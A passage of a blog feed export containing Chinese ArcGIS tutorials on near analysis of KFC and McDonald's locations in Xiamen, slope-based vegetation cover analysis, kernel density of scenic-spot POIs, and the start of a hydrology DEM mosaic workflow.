alt></p></li><li><p><strong>近邻分析</strong></p><p>利用<em>【分析工具】|【邻域分析】|【近邻分析】</em>对肯德基POI和交点进行匹配</p><p>【输入要素】选择肯德基</p><p>【邻近要素】选择交点</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/725451b1e972dd5aa44508860ed69493.png" alt></p><p>打开肯德基的属性表，可以看到新增了NEAR_FID和NEAR_DIST两个字段</p><p>即肯德基与交点的匹配字段码和距离</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/5ea8ee5f45909033307e2944b01bbe0d.png" alt></p><p>可以利用查询工具进行检验</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/678231b0f32875542058e64d3d861be4.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/2390184660a5a71490172a1056e2e881.png" alt></p><p>在相交点的图层上右键单击【连接与关联】|【连接】</p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/88ca81c670fbcd20275c571e2e42e8b2.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/92b50dececd409a323f8a4708cd691e2.png" alt></p><p>​    打开该图层的的属性表，可以看到已经完成连接，但是有空值的出现，直接删除掉就可以了（匹配不到）</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/02a26b76c46e91a8cb74c3ad0888b380.png" alt></p><p>​    最后肯德基的图层右键【属性】|【定义查询】</p><p>​    输入”肯德基.FID &gt; 0”即可将肯德基的点吸附到相交的棋盘点上</p><p>​    <img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/445ba7e311120157615d9b67cd2a1605.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/3355a50fa6c5edf8050226225a08240b.png" alt></p><p>​    麦当劳的可视化过程一样，这里不再赘述</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/b5f100485ee3b100eb48a5fa1cfbd859.png" alt></p><ol start="4"><li><p><strong>符号化</strong></p><p>将棋盘线颜色设为RGB(75,32,0)</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/1b611fd3149888419201b3435ae528d9.png" alt></p><p>将厦门行政区颜色设置RGB(176,133,89)</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/f1a141996a09ea0be5817c3af389a900.png" alt></p><p>成果图如下：</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%9B%B4%E6%A3%8B%E8%A7%86%E8%A7%92%E4%B8%8B%E8%82%AF%E5%BE%B7%E5%9F%BA%E9%BA%A6%E5%BD%93%E5%8A%B3%E5%88%86%E5%B8%83%E7%89%B9%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96-%E5%8E%A6%E9%97%A8%E4%B8%BA%E4%BE%8B/0e27d85fb56d0d8af24b177ad7603cdd.png" alt="0e27d85fb56d0d8af24b177ad7603cdd"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ArcGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> ArcGIS </tag>
            
            <tag> 空间分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArcGIS不同坡度植被覆盖率分析</title>
      <link href="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/"/>
      <url>/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><h2 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h2><h3 id="实验数据准备"><a href="#实验数据准备" class="headerlink" title="实验数据准备"></a>实验数据准备</h3><p>梅江区DEM高程数据及梅江区植被覆盖（草地、耕地、林地）矢量数据</p><h3 id="理论概念"><a href="#理论概念" class="headerlink" title="理论概念"></a>理论概念</h3><p><strong>坡度：</strong></p><ul><li><p>地表面任一点的坡度是指过该点的切平面与水平地面的夹角，坡度表示了地表面在该点的倾斜程度</p></li><li><p>实际应用中，坡度有两种表示方法</p><p>①坡度，即水平面与地形面之间夹角</p><p>②坡度百分比：即高程增量与水平增量之间的百分数</p></li></ul><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/e985eeb8d878c964cb3178c13274b610.png" alt></p><p><strong>坡度分析：</strong></p><p>工具：【Spacil Analyst】|【表面分析】|【坡度】</p><p>【坡度表示方法】默认为DEGREE</p><p>【Z因子】输入高程变换系数，一般用于平面度量单位与高程度量单位不一致的情况</p><p><strong>重分类：</strong></p><p>基于原有数值，对原有数值重新进行分类整理从而得到一组新值并输出</p><p>工具：【Spacil Analyst】|【重分类】|【重分类】</p><p><strong>叠加分析-标识：</strong></p><p>输入图层进行叠加，是在图层交迭的区域，表示图层的属性将赋给输入图层在该区域内的底图要素，同时交迭区域也有部分的图形的变化</p><p>工具：【分析工具】|【叠加分析】|【标识】</p><p>需注意在ArcGIS中标识图层必须是多边形图层</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><strong>坡度分析</strong></li></ol><p>利用<em>【Spacial Analyst】|【表面分析】|【坡度】</em>输出梅江区的坡度数据</p><p>其中参数设置为：</p><ul><li><p>【输出测量单位】为DEGREE(百分比)</p></li><li><p>【Z因子】为0.0001</p></li></ul><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/b5d04bf7c9cdecd30bce8d3aab0b92ba.png" alt></p><ol start="2"><li><p><strong>重分类</strong></p><p>由于直接计算坡度，数据会比较离散，后面无法进行分区统计，因此利用重分类把坡度分成若干要统计的类别</p><p>实验数据范围为10-85，可以将其分为9类</p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/a1ab2ac16aac20572b8aaab0f9bc923f.png" alt></p><ol start="3"><li><p><strong>栅格转面</strong></p><p>要把栅格数据转换为矢量（这里也可以把矢量的数据转换栅格，反正要进行叠加分析，数据纬度要进行统一）</p><p>利用<em>【转换工具】|【由栅格转出】|【栅格转面】</em></p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/11c4126fef305292dda8cda3f00d9ea3.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/00158b09c5820d6f80ef7bfef5ae7640.png" alt></p><ol start="4"><li><p><strong>叠加分析-标识</strong></p><p>接下来利用<em>【分析工具】|【叠加分析】|【标识】</em>将梅江区的植被覆盖数据和坡度数据进行标识</p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/2b20af0a5dba6101c5ccb99674f9cbc4.png" alt></p><p>​    查看叠加分析后图层的属性表</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/b905f457368455200f27b0fe848ecca1.png" alt></p><ol start="5"><li><strong>汇总统计</strong></li></ol><p>利用<em>【分析工具】|【统计分析】|【汇总统计数据】</em>将相同的面积进行加和</p><p>【统计字段】选择Area，【统计类型】为SUM</p><p>【案例分组字段】选择gridcode和class_name</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/3eb372814ebbcbba40590fa0971e0f2a.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/33468625cf9f4e072f1e713c55d2aa9d.png" alt></p><ol start="6"><li><p><strong>Excel之图表</strong></p><p>将该属性表导出为dbf格式</p><p>然后再excel中打开</p><p>并进行制图表</p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/55cac0d13a512137fcfdd924eabea8a7.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/fbb51c84473bcb0c4d4759a296a796d2.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/c4da4ccdfc14f093a21e9a86ab31f6e8.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/f0c108a38196227d342eaa07b3d42125.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/716f803ed55b6538663f7de0323cb7d3.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/ffe0700d628f9ee56b3a4b6a833cb9b5.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/b73e2e2ea8891d07c26f527d5cb143c2.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/f90be1c024978dd730af5440bf8c0306.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E4%B8%8D%E5%90%8C%E5%9D%A1%E5%BA%A6%E6%A4%8D%E8%A2%AB%E8%A6%86%E7%9B%96%E7%8E%87%E5%88%86%E6%9E%90/6774d280d4915baddb73779000270554.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> ArcGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> ArcGIS </tag>
            
            <tag> 空间分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArcGIS基于厦门景点POI 的核密度分析（平面及三维显示）</title>
      <link href="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/"/>
      <url>/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>掌握<strong>核密度分析</strong>研究厦门旅游空间分布特征。本实验基于POI数据对厦门全域旅游空间格局进行分析</p><h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><h2 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h2><p>由规划云中的POI查询工具获取到厦门市的旅游景点POI数据（原是通过高德地图开方平台获取到POI数据然后进行清洗整理，这部分内容到后面有时间再来补充，本实验直接采用规划云中POI景点数据，共151个景点）</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><ol><li>将收集到的文本数据在Excel中打开，在菜单栏上选择【数据】|【获取外部数据】|【自文本】</li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/83618a09faaa7ce6e4e9d12e4e804f19.png" alt></p><ol start="2"><li>然后以逗号为分隔符，将数据导入Excel表</li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/5e9d07fb37a77dc84a70bb7cb6722547.png" alt></p><ol start="3"><li>打开ArcMap，右键单击属性，查看图层的坐标系</li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/5f70f5ce3ff35c8e731b98f98d748467.png" alt></p><ol start="4"><li>可以看到数据为地理坐标系，我们需要给它们设置投影坐标系</li></ol><h2 id="投影坐标系"><a href="#投影坐标系" class="headerlink" title="投影坐标系"></a>投影坐标系</h2><ol><li>利用<em>【数据管理工具】|【投影与变换】|【要素】|【投影】</em>进行设置</li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/5ba922ba41782107e4f6f70c9afad978.png" alt></p><ol start="2"><li>由于更改投影是临时的，我们需要将数据重新导出再打开，查看图层的属性，可以看到已经投影成功</li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/0706647d1f81eab36b520a857f84a92d.png" alt></p><h2 id="核密度分析"><a href="#核密度分析" class="headerlink" title="核密度分析"></a>核密度分析</h2><ol><li><strong>处理环境设置</strong></li></ol><p>利用<em>【Spacial Analyst】|【密度分析】|【核密度分析】</em>进行核密度分析</p><p>打开对话框后，首先设置【环境】，将【处理范围】和【栅格分析】处理为一致的厦门行政区，其他默认，OK</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/f31532d9f5b16869fabd9beb7f127bc9.png" alt></p><ol start="2"><li><strong>拉伸设置</strong></li></ol><p>在图层右键图层属性，选择【符号系统】|【拉伸】，选择合适的颜色进行美化拉伸</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/f37d7b9460b6ab9b34c0d617101545b4.png" alt></p><p>因为点不够密集，做出来的效果不太明显</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/f957c1f9c174eebc15d4991edc9ff3e9.png" alt></p><h2 id="三维显示"><a href="#三维显示" class="headerlink" title="三维显示"></a>三维显示</h2><p>打开ArcScene，将核密度分析的平面栅格打开</p><p>右键图层属性【符号系统】|【分类】</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/eaec32987199751b24073a9d340ebfcf.png" alt></p><p>选择【基本高度】|【在自定义表面上浮动】</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/b80ffca260ef83df4ffadd9ace987c1a.png" alt></p><p>然后再菜单栏上选择【视图】|【场景属性】|【基于范围进行计算】OK</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/ec966c789f4a35fa012e6d92790bc86d.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/b80ffca260ef83df4ffadd9ace987c1a.png" alt></p><p>由于本次实验的数据数量太少，效果不突出，不过流程步骤是可以的（或者你可以在进行核密度处理的时候，将【搜索半径】调大或调小来适应你的数据）</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9F%BA%E4%BA%8E%E5%8E%A6%E9%97%A8%E6%99%AF%E7%82%B9POI-%E7%9A%84%E6%A0%B8%E5%AF%86%E5%BA%A6%E5%88%86%E6%9E%90%EF%BC%88%E5%B9%B3%E9%9D%A2%E5%8F%8A%E4%B8%89%E7%BB%B4%E6%98%BE%E7%A4%BA%EF%BC%89/9d6bb80417d13ec27b5dff56f336588f.png" alt="9d6bb80417d13ec27b5dff56f336588f"></p>]]></content>
      
      
      <categories>
          
          <category> ArcGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> ArcGIS </tag>
            
            <tag> 空间分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArcGIS水文分析与表面分析</title>
      <link href="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/"/>
      <url>/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="水文分析"><a href="#水文分析" class="headerlink" title="水文分析"></a>水文分析</h1><h2 id="1-拼接DEM"><a href="#1-拼接DEM" class="headerlink" title="1.拼接DEM"></a>1.拼接DEM</h2><ol><li><p>选择【数据管理工具】|【栅格】|【栅格数据集】|【镶嵌至新栅格】工具，打开对话框；</p></li><li><p>【输入栅格】中选择要拼接的栅格块；</p></li><li><p>【输出位置】|【具有拓展名的栅格数据集名称】|【像素类型】|【波段数】|【镶嵌运算符】（这里选MEAN）</p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/ac7471688897a1d7405ee31b73fdee75.jpg" alt="C:\\Users\\cjy\\Desktop\\DEM栅格数据拼接.jpg"></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/81945647cd537731d057d26ffc92a659.png" alt></p><p>​    